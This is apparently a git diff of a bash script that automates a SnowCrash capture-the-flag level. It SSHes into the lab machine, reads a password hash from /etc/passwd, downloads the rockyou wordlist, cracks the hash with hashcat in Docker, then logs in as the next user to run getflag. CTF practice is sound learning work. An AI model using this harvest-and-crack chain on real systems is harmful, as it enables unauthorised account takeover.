@@ -11,6 +11,31 @@ log() {
     echo "[$(date +'%Y-%m-%d %H:%M:%S')] $*";
 }
 
+download_rockyou_wordlist() {
+    wordlist_dir="$1";
+    rockyou_wordlist_url="https://weakpass.com/download/90/rockyou.txt.gz";
+
+    if [ -z "$wordlist_dir" ]; then
+        log "Error: download_rockyou_wordlist: missing wordlist directory" >&2;
+        return 1;
+    fi
+
+    if [ ! -d "$wordlist_dir" ]; then
+        log "Error: download_rockyou_wordlist: '$wordlist_dir' is not a directory" >&2;
+        return 1;
+    fi
+
+    if [ -f "$wordlist_dir/rockyou.txt" ]; then
+        echo "$wordlist_dir/rockyou.txt";
+        return 0;
+    fi
+
+    curl -L "$rockyou_wordlist_url" -o "$wordlist_dir/rockyou.txt.gz" --silent --show-error --fail || return 1;
+    gzip -d "$wordlist_dir/rockyou.txt.gz" || return 1;
+
+    echo "$wordlist_dir/rockyou.txt";
+}
+
 ##############
 ### DOCKER ###
 ##############
@@ -22,11 +47,31 @@ assert_docker() {
     fi
 }
 
-hashcat_identify_hash_algorythm() {
-    hash="$1";
-
+hashcat_crack_hash() {
     assert_docker;
-    docker run --rm dizcza/docker-hashcat:pocl --interactive -- hashcat --identify "$hash";
+
+    hash="$1";
+    out_dir="$2";
+    wordlist_path="$3";
+
+    if [ -z "$hash" ] || [ -z "$out_dir" ] || [ -z "$wordlist_path" ]; then
+        log "Error: hashcat_crack_hash: missing arguments. You should provide <hash> <out_dir> <wordlist_path>." >&2;
+        return 1;
+    fi
+
+    if [ ! -f "$wordlist_path" ]; then
+        default_wordlist_url="https://weakpass.com/download/90/rockyou.txt.gz";
+        echo "No wordlist found at $wordlist_path. Downloading and extracting the default wordlist: $default_wordlist_url";
+        curl -L "$default_wordlist_url" -o "$wordlist_path.gz" --silent --show-error --fail || return 1;
+        gzip -d "$wordlist_path.gz" || return 1;
+    fi
+
+    docker run --rm -it \
+        -v "$wordlist_path:/wordlist.txt:ro" \
+        -v "$out_dir:/out:rw" dizcza/docker-hashcat:pocl \
+        hashcat --attack-mode 3 --hash-type 1500 "$hash" /wordlist.txt -o /out/cracked.txt >/dev/null 2>&1;
+    cracked_password=$(cat "$out_dir/cracked.txt" | cut -d: -f2);
+    echo "$cracked_password";
 }
 
 ###########
@@ -128,41 +173,23 @@ main() {
     flag01_username="flag01";
     flag01_password="";
 
-    # As the initial setup is similar to what we hd 
+    wordlist_path=$(download_rockyou_wordlist "$CURR_DIR_PATH/wordlists" || exit 1);
 
-    trap 'close_ssh_socket "$level01_socket_path" "$host" "$port" "$level01_username"' EXIT;
+    trap 'close_ssh_socket "$level01_socket_path" "$host" "$port" "$level01_username"' EXIT USR1;
     init_ssh_socket "$level01_socket_path" "$host" "$port" "$level01_username" "$level01_password" || exit 1;
-    flag01_password=$(
+    hashed_password=$(ssh_exec_via_socket "$level01_socket_path" "$host" "$port" "$level01_username" "cat /etc/passwd | grep ${flag01_username} | cut -d: -f2");
+    flag01_password=$(hashcat_crack_hash "$hashed_password"  "$CURR_DIR_PATH/out" "$wordlist_path");
+    kill -USR1 $$;
 
-    );
+    trap 'close_ssh_socket "$flag01_socket_path" "$host" "$port" "$flag01_username"' EXIT USR1;
+    init_ssh_socket "$flag01_socket_path" "$host" "$port" "$flag01_username" "$flag01_password" || exit 1;
+    checkflag_str=$(ssh_exec_via_socket "$flag01_socket_path" "$host" "$port" "$flag01_username" "getflag");
+    checkflag=$(echo -n "$checkflag_str" | head -n 1 | awk  '{print $NF}');
+    kill -USR1 $$;
 
-    # flag00_socket_path=$(get_ssh_socket_path "snowcrash_flag00_socket") || exit 1;
-    # flag00_username="flag00";
-    # flag00_password="";
-
-    # trap 'close_ssh_socket "$level00_socket_path" "$host" "$port" "$level00_username"' EXIT;
-    # init_ssh_socket "$level00_socket_path" "$host" "$port" "$level00_username" "$level00_password" || exit 1;
-    # flag00_password=$(
-    #     flag00_owned_readable_files=$(ssh_exec_via_socket "$ssh_socket_path" "$host" "$port" "$level00_username" "find / -user flag00 -perm -o=r 2>/dev/null");
-    #     flag00_cyphered_password_filename=$(echo "$flag00_owned_readable_files" | grep "/usr/sbin/" |head -n 1);
-    #     flag00_cyphered_password=$(ssh_exec_via_socket "$ssh_socket_path" "$host" "$port" "$level00_username" "cat ${flag00_cyphered_password_filename}");
-    #     # Le MDP est stocké dans un fichier lisible mais encrypté (pas hashé).
-    #     # En usant du site: "https://www.dcode.fr/chiffre-cesar" on découvre qu'il s'agit d'un chiffrement césar, aussi dit rot-n.
-    #     flag00_password=$(rotn "$flag00_cyphered_password" 15 "+");
-    #     echo "$flag00_password";
-
-    #     ssh_exec_via_socket "$ssh_socket_path" "$host" "$port" "$level00_username" "su - flag00";
-    # )
-    # close_ssh_socket "$level00_socket_path" "$host" "$port" "$level00_username";
-
-    # trap 'close_ssh_socket "$flag00_socket_path" "$host" "$port" "$flag00_username"' EXIT;
-    # init_ssh_socket "$flag00_socket_path" "$host" "$port" "$flag00_username" "$flag00_password" || exit 1;
-    # checkflag_str=$(ssh_exec_via_socket "$ssh_socket_path" "$host" "$port" "$flag00_username" "getflag");
-    # checkflag=$(echo -n "$checkflag_str" | head -n 1 | awk  '{print $NF}');
-    # close_ssh_socket "$flag00_socket_path" "$host" "$port" "$flag00_username"
-
-    # flag_outpath="$CURR_DIR_PATH/../flag";
-    # echo "$checkflag" > $flag_outpath;
+    flag_outpath="$CURR_DIR_PATH/../flag";
+    echo "Checkflag: $checkflag";
+    echo "$checkflag" > "$flag_outpath";
 }
 
 main "$@";
